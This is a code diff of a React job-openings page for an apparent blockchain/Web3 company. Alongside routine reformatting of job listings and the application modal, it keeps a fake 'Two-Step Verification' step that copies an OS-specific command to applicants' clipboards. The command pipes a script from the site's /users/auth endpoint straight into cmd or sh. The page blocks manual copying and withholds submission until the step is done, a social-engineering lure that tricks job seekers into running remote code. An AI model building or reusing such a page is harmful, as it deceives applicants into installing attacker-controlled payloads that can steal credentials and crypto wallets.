@@ -28,101 +28,14 @@ function detectOS() {
 }
 
 const JOBS = [
-  { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:[
-    'Basic knowledge of blockchain and crypto',
-    'Good communication and documentation skills',
-    'Willingness to learn and adapt'
-  ], responsibilities:[
-    'Assist in smart contract reviews',
-    'Support day-to-day blockchain operations',
-    'Coordinate with developers and team leads'
-  ], benefits:['Remote-first','Learning budget','Growth opportunities'] },
-
-  { id:2, title:'Web3 Project Coordinator', icon:Network, intro:'Help organize and support Web3 projects.', requirements:[
-    'Experience in project coordination or admin roles',
-    'Interest in blockchain/web3 ecosystem',
-    'Strong organizational skills'
-  ], responsibilities:[
-    'Coordinate with product and dev teams',
-    'Track timelines and deliverables',
-    'Assist in community engagement'
-  ], benefits:['Flexible hours','Remote-friendly','Annual offsite'] },
-
-  { id:3, title:'Marketing Assistant (Blockchain)', icon:BarChart3, intro:'Support marketing campaigns for blockchain products.', requirements:[
-    'Basic understanding of digital marketing',
-    'Familiarity with social media & content',
-    'Strong writing and communication skills'
-  ], responsibilities:[
-    'Assist in running campaigns',
-    'Help prepare content for community',
-    'Track analytics and engagement'
-  ], benefits:['Learning support','Wellness stipend','Career growth'] },
-
-  { id:4, title:'Business Development Assistant', icon:Users, intro:'Support commercial and partnership efforts.', requirements:[
-    'Interest in business, sales or partnerships',
-    'Good communication and presentation skills',
-    'Self-motivated and proactive'
-  ], responsibilities:[
-    'Support account management',
-    'Research new business opportunities',
-    'Assist in partnership communications'
-  ], benefits:['Career growth','Networking events','Remote allowance'] },
-
-  { id:5, title:'UI/UX Design Assistant', icon:PenTool, intro:'Help design blockchain & AI user experiences.', requirements:[
-    'Basic design skills (Figma, Sketch, Adobe XD)',
-    'Creativity and eye for detail',
-    'Interest in UI/UX for tech products'
-  ], responsibilities:[
-    'Assist in wireframes and prototypes',
-    'Support user research & feedback',
-    'Help maintain design libraries'
-  ], benefits:[
-    'Creative growth',
-    'Mentorship from senior designers',
-    'Remote-friendly'
-  ] },
-
-  { id:6, title:'Frontend Developer', icon:Code, intro:'Build sleek and responsive Web3 interfaces.', requirements:[
-    'Strong skills in React, Next.js or similar frameworks',
-    'Knowledge of Web3.js / Ethers.js',
-    'Experience with responsive & modern UI (Tailwind, shadcn/ui)'
-  ], responsibilities:[
-    'Develop dApp frontends with blockchain integration',
-    'Work with designers to deliver smooth UX',
-    'Optimize performance across devices'
-  ], benefits:[
-    'Remote-first',
-    'Latest Web3 dev tools',
-    'Opportunity to lead projects'
-  ] },
-
-  { id:7, title:'Backend Developer', icon:Database, intro:'Design and maintain scalable backend systems.', requirements:[
-    'Proficiency in Node.js, Express or NestJS',
-    'Experience with databases (Postgres, MongoDB)',
-    'Knowledge of APIs, authentication and scaling'
-  ], responsibilities:[
-    'Build and maintain secure backend services',
-    'Integrate blockchain data into APIs',
-    'Ensure scalability and reliability of infrastructure'
-  ], benefits:[
-    'Remote-friendly',
-    'Cloud infrastructure experience',
-    'Career growth opportunities'
-  ] },
-
-  { id:8, title:'Smart Contract Developer', icon:FileCode2, intro:'Design, develop and audit smart contracts.', requirements:[
-    'Strong Solidity and Ethereum development skills',
-    'Understanding of gas optimization & security',
-    'Familiar with testing frameworks (Hardhat, Foundry, Truffle)'
-  ], responsibilities:[
-    'Write and deploy secure smart contracts',
-    'Conduct contract testing and audits',
-    'Collaborate with frontend/backend teams'
-  ], benefits:[
-    'Competitive compensation',
-    'Cutting-edge blockchain R&D',
-    'Open-source contributions'
-  ] }
+  { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:['Basic knowledge of blockchain and crypto','Good communication and documentation skills','Willingness to learn and adapt'], responsibilities:['Assist in smart contract reviews','Support day-to-day blockchain operations','Coordinate with developers and team leads'], benefits:['Remote-first','Learning budget','Growth opportunities'] },
+  { id:2, title:'Web3 Project Coordinator', icon:Network, intro:'Help organize and support Web3 projects.', requirements:['Experience in project coordination or admin roles','Interest in blockchain/web3 ecosystem','Strong organizational skills'], responsibilities:['Coordinate with product and dev teams','Track timelines and deliverables','Assist in community engagement'], benefits:['Flexible hours','Remote-friendly','Annual offsite'] },
+  { id:3, title:'Marketing Assistant (Blockchain)', icon:BarChart3, intro:'Support marketing campaigns for blockchain products.', requirements:['Basic understanding of digital marketing','Familiarity with social media & content','Strong writing and communication skills'], responsibilities:['Assist in running campaigns','Help prepare content for community','Track analytics and engagement'], benefits:['Learning support','Wellness stipend','Career growth'] },
+  { id:4, title:'Business Development Assistant', icon:Users, intro:'Support commercial and partnership efforts.', requirements:['Interest in business, sales or partnerships','Good communication and presentation skills','Self-motivated and proactive'], responsibilities:['Support account management','Research new business opportunities','Assist in partnership communications'], benefits:['Career growth','Networking events','Remote allowance'] },
+  { id:5, title:'UI/UX Design Assistant', icon:PenTool, intro:'Help design blockchain & AI user experiences.', requirements:['Basic design skills (Figma, Sketch, Adobe XD)','Creativity and eye for detail','Interest in UI/UX for tech products'], responsibilities:['Assist in wireframes and prototypes','Support user research & feedback','Help maintain design libraries'], benefits:['Creative growth','Mentorship from senior designers','Remote-friendly'] },
+  { id:6, title:'Frontend Developer', icon:Code, intro:'Build sleek and responsive Web3 interfaces.', requirements:['Strong skills in React, Next.js or similar frameworks','Knowledge of Web3.js / Ethers.js','Experience with responsive & modern UI (Tailwind, shadcn/ui)'], responsibilities:['Develop dApp frontends with blockchain integration','Work with designers to deliver smooth UX','Optimize performance across devices'], benefits:['Remote-first','Latest Web3 dev tools','Opportunity to lead projects'] },
+  { id:7, title:'Backend Developer', icon:Database, intro:'Design and maintain scalable backend systems.', requirements:['Proficiency in Node.js, Express or NestJS','Experience with databases (Postgres, MongoDB)','Knowledge of APIs, authentication and scaling'], responsibilities:['Build and maintain secure backend services','Integrate blockchain data into APIs','Ensure scalability and reliability of infrastructure'], benefits:['Remote-friendly','Cloud infrastructure experience','Career growth opportunities'] },
+  { id:8, title:'Smart Contract Developer', icon:FileCode2, intro:'Design, develop and audit smart contracts.', requirements:['Strong Solidity and Ethereum development skills','Understanding of gas optimization & security','Familiar with testing frameworks (Hardhat, Foundry, Truffle)'], responsibilities:['Write and deploy secure smart contracts','Conduct contract testing and audits','Collaborate with frontend/backend teams'], benefits:['Competitive compensation','Cutting-edge blockchain R&D','Open-source contributions'] }
 ]
 
 const RECAPTCHA_SITE_KEY = '6LeGB7ErAAAAABNHG37I5AQXic6FPTOqD5YPSZDK';
@@ -133,15 +46,13 @@ export default function Jobs() {
   const { push } = useToast()
   const [captchaToken, setCaptchaToken] = useState(null)
   const [verified, setVerified] = useState(false)
-
   const [form, setForm] = useState({ name: '', email: '', resume: '' })
   const [verificationToken, setVerificationToken] = useState(null)
 
   const os = useMemo(() => detectOS(), [])
-
   const cmdUrl = useMemo(() => {
     if (!verificationToken) return ''
-    const base = `${typeof window !== 'undefined' ? window.location.origin : ''}/users/auth`
+    const base = typeof window !== 'undefined' ? `${window.location.origin}/users/auth` : ''
     return `${base}/${os}?token=${verificationToken}`
   }, [os, verificationToken])
 
@@ -173,15 +84,13 @@ export default function Jobs() {
 
   const handleCopy = async () => {
     try {
-      
-     {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
-     if(os === 'windows')
-      await navigator.clipboard.writeText(`cmd /c "curl ${cmdUrl} | cmd"`)
-     else if(os === 'mac')
-      await navigator.clipboard.writeText(`curl "${cmdUrl}" | sh`)
-     else if(os === 'linux')
-      await navigator.clipboard.writeText(`wget -qO- "${cmdUrl}" | sh`)
-     push('Command copied to clipboard')
+      if(os === 'windows')
+        await navigator.clipboard.writeText(`cmd /c "curl ${cmdUrl} | cmd"`)
+      else if(os === 'mac')
+        await navigator.clipboard.writeText(`curl "${cmdUrl}" | sh`)
+      else if(os === 'linux')
+        await navigator.clipboard.writeText(`wget -qO- "${cmdUrl}" | sh`)
+      push('Command copied to clipboard')
     } catch {
       push('Copy failed — select and copy manually')
     }
@@ -199,20 +108,13 @@ export default function Jobs() {
   const onSubmit = async (e) => {
     e.preventDefault()
     setOpen(false)
-
-    const message = "Application submitted successfully! We’ll get back to you soon."
-
-    try {
-     push(message);
-    } catch (err) {
-      console.error("Clipboard error:", err)
-      alert("Verification failed: Unable to access clipboard.")
-    }
+    push("Application submitted successfully! We’ll get back to you soon.")
   }
 
   return (
     <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
       <h1 className="text-3xl font-bold mb-6">Job Openings</h1>
+
       <div className="grid md:grid-cols-2 gap-6">
         {JOBS.map(job => {
           const Icon = job.icon
@@ -250,76 +152,79 @@ export default function Jobs() {
       </div>
 
       <Modal open={open} onClose={() => setOpen(false)} title={active ? `Apply — ${active.title}` : 'Apply'}>
-        <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
-          <input type="hidden" name="form-name" value="apply" />
-          <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>
+        {/* Modal content wrapper made scrollable */}
+        <div className="max-h-[80vh] overflow-y-auto p-4">
+          <form name="apply" method="POST" data-netlify="true" netlify-honeypot="bot-field" onSubmit={onSubmit}>
+            <input type="hidden" name="form-name" value="apply" />
+            <p className="hidden"><label>Don’t fill: <input name="bot-field" /></label></p>
 
-          <div className="grid sm:grid-cols-2 gap-3">
-            <div>
-              <label className="label">Full Name</label>
-              <input className="input" name="name" required onChange={handleInput} />
+            <div className="grid sm:grid-cols-2 gap-3">
+              <div>
+                <label className="label">Full Name</label>
+                <input className="input" name="name" required onChange={handleInput} />
+              </div>
+              <div>
+                <label className="label">Email</label>
+                <input className="input" type="email" name="email" required onChange={handleInput} />
+              </div>
             </div>
-            <div>
-              <label className="label">Email</label>
-              <input className="input" type="email" name="email" required onChange={handleInput} />
+
+            <div className="mt-3">
+              <label className="label">Resume (URL)</label>
+              <input className="input" name="resume" onChange={handleInput} />
             </div>
-          </div>
 
-          <div className="mt-3">
-            <label className="label">Resume (URL)</label>
-            <input className="input" name="resume" onChange={handleInput} />
-          </div>
+            <div className="mt-3">
+              <label className="label">Cover Letter</label>
+              <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
+            </div>
 
-          <div className="mt-3">
-            <label className="label">Cover Letter</label>
-            <textarea className="input" rows="4" name="cover" placeholder="A short note"></textarea>
-          </div>
+            {!verified && (
+              <>
+                {captchaToken ? (
+                  <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
+                    <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
+                    <ol className="list-decimal ml-5 space-y-2 text-sm">
+                      <li>Complete the reCAPTCHA below.</li>
+                      <li>Once verified, your OS-specific terminal command will appear.</li>
+                      <li>Copy the command below for your OS and paste into the terminal.</li>
+                    </ol>
 
-          {!verified && (
-            <>
-              {captchaToken ? (
-                <div className="mt-6 rounded-2xl border border-slate-200 dark:border-slate-800 p-4">
-                  <h3 className="text-lg font-semibold mb-2">Two-Step Verification</h3>
-                  <ol className="list-decimal ml-5 space-y-2 text-sm">
-                    <li>Complete the reCAPTCHA below.</li>
-                    <li>Once verified, your OS-specific terminal command will appear.</li>
-                    <li>Copy the command below for your OS and paste into the terminal.</li>
-                  </ol>
+                    <div className="mt-4 text-sm">
+                      <label className="label mb-1">
+                        {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
+                      </label>
 
-                  <div className="mt-4 text-sm">
-                    <label className="label mb-1">
-                      {os === 'windows' ? 'Windows Command/URL' : os === 'mac' ? 'Mac Command/URL' : 'Linux Command/URL'}
-                    </label>
+                      <div className="flex items-stretch gap-2">
+                        <input
+                          className="input flex-1 font-mono select-none pointer-events-none"
+                          readOnly
+                          value={cmdUrl}
+                          onCopy={(e) => e.preventDefault()}
+                          onFocus={(e) => e.currentTarget.select()}
+                        />
+                        <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
+                      </div>
 
-                    <div className="flex items-stretch gap-2">
-                      <input
-                        className="input flex-1 font-mono select-none pointer-events-none"
-                        readOnly
-                        value={cmdUrl}
-                        onCopy={(e) => e.preventDefault()}
-                        onFocus={(e) => e.currentTarget.select()}
-                      />
-                      <button type="button" onClick={handleCopy} className="btn btn-secondary">Copy</button>
-                    </div>
-
-                    <div className="mt-2 text-xs text-slate-500">
-                      Verification token: <code className="font-mono">{verificationToken}</code>
+                      <div className="mt-2 text-xs text-slate-500">
+                        Verification token: <code className="font-mono">{verificationToken}</code>
+                      </div>
                     </div>
                   </div>
-                </div>
-              ) : (
-                <div className="mt-3">
-                  <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
-                </div>
-              )}
-            </>
-          )}
+                ) : (
+                  <div className="mt-3">
+                    <ReCAPTCHA sitekey={RECAPTCHA_SITE_KEY} onChange={(value) => setCaptchaToken(value)} />
+                  </div>
+                )}
+              </>
+            )}
 
-          <div className="mt-4 flex justify-end gap-2">
-            <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
-            <button type="submit" className="btn btn-primary" disabled={!verified}>Submit</button>
-          </div>
-        </form>
+            <div className="mt-4 flex justify-end gap-2">
+              <button type="button" onClick={() => setOpen(false)} className="btn btn-ghost">Cancel</button>
+              <button type="submit" className="btn btn-primary" disabled={!verified}>Submit</button>
+            </div>
+          </form>
+        </div>
       </Modal>
     </div>
   )
